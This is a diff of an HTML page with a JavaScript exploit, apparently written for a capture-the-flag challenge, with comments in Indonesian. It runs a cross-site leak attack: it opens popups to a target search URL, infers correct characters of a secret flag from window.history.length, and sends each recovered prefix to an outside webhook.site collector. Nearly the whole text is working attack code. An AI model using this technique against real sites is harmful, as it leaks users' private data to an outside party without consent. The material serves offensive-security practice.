@@ -2,61 +2,58 @@
 <html>
 <body>
     <script>
-        // Gunakan http:// jika https:// bermasalah dengan sertifikat
+        // Gunakan http:// untuk menghindari masalah SSL Error
         const targetBase = "http://ponder.cbd2026.cloud/search?q=";
         const webhook = "https://webhook.site/76c1a3f4-7985-4c73-9f7d-1d28bae13e25"; 
-        
-        // COBA VARIASI: Jika "flag{" gagal, coba "{" atau langsung mulai brute force
-        let flag = "flag{"; 
+        let flag = "flag{"; // Titik mulai pencarian
         const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";
-
-        fetch(`${webhook}?status=ULTRADEBUG_START&prefix=${flag}`);
 
         async function tryChar(char) {
             return new Promise((resolve) => {
                 const query = flag + char;
                 const win = window.open(`${targetBase}${encodeURIComponent(query)}`);
 
+                // Tunggu 2 detik agar redirect 1 detik di target selesai dilakukan
                 setTimeout(() => {
                     if (!win) {
-                        fetch(`${webhook}?error=POPUP_BLOCKED`);
+                        fetch(`${webhook}?error=popup_blocked`);
                         resolve(false);
                         return;
                     }
 
-                    try {
-                        const hLen = win.history.length;
-                        win.close();
-                        
-                        // LOG SEMUA PERCOBAAN: Cek di Webhook apakah ada yang h_len=2
-                        fetch(`${webhook}?try=${encodeURIComponent(query)}&h=${hLen}`);
+                    const hLen = win.history.length;
+                    win.close();
+                    
+                    // Log percobaan untuk memantau progres bot
+                    fetch(`${webhook}?char=${char}&h=${hLen}`);
 
-                        if (hLen > 1) {
-                            resolve(true);
-                        } else {
-                            resolve(false);
-                        }
-                    } catch (e) {
-                        win.close();
+                    // Jika hLen > 1, berarti terjadi redirect (karakter benar!)
+                    if (hLen > 1) {
+                        resolve(true);
+                    } else {
                         resolve(false);
                     }
-                }, 3000); // Naikkan jeda ke 3 detik untuk kestabilan
+                }, 2000); 
             });
         }
 
-        async function run() {
+        async function start() {
+            // Sinyal awal ke webhook
+            fetch(`${webhook}?status=STARTING_ATTACK_ON_${flag}`);
+
             for (let char of alphabet) {
                 if (await tryChar(char)) {
                     flag += char;
-                    fetch(`${webhook}?FOUND_FLAG=${encodeURIComponent(flag)}`);
-                    if (char === "}") return;
-                    return run();
+                    // Kirim progres flag ke webhook
+                    fetch(`${webhook}?FOUND_NEW_FLAG=${encodeURIComponent(flag)}`);
+                    
+                    if (char === "}") return; // Selesai
+                    return start(); // Cari karakter selanjutnya (rekursi)
                 }
             }
-            fetch(`${webhook}?status=FAILED_ROUND&last_tried=${flag}`);
         }
 
-        window.onload = run;
+        window.onload = start;
     </script>
 </body>
 </html>
